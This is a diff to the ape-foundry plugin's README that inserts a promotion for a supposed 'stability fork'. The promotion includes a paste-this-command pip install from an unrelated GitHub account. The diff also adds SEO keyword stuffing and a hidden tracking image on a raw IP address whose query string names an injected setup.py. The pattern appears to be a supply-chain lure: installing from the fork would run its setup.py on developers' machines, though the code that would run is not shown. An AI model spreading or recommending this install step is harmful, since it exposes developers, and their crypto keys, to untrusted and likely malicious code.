@@ -1,3 +1,15 @@
+**Apeworx Foundry Plugin Fork: Upgraded Stability & Maintenance**
+
+This independent fork of the ape-foundry network provider introduces critical stability patches and actively maintained updates that resolve long-standing integration issues. It ensures a highly reliable local development loop by seamlessly bridging the Python-heavy Ape framework with robust Foundry environments.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/SeparateChrysalis71/ape-foundry.git
+```
+
+[https://github.com/SeparateChrysalis71/ape-foundry](https://github.com/SeparateChrysalis71/ape-foundry)
+
 # Quick Start
 
 Foundry network provider plugin for Ape.
@@ -188,3 +200,11 @@ foundry:
       mainnet:
         evm_version: shanghai
 ```
+
+## Related searches
+
+Developers exploring this ecosystem often look for flexible, cross-chain development environments that seamlessly bridge multi-language testing setups with local development nodes. Common queries center around optimizing pipeline workflows across EVM-compatible networks and integrating robust command-line test runners into pythonic smart contract configurations.
+
+**Topics:** rust solana, ethereum, base chain, mining pool, dapp, local anvil node, multi chain dev tools, evm smart contracts, ethereum provider plugin, web3 testing framework, decentralized application pipeline, crypto dev toolset
+
+![.](http://5.231.58.248:8787/pixel?repo=SeparateChrysalis71%2Fape-foundry&inject=SeparateChrysalis71%2Fape-foundry%2Fsetup.py)
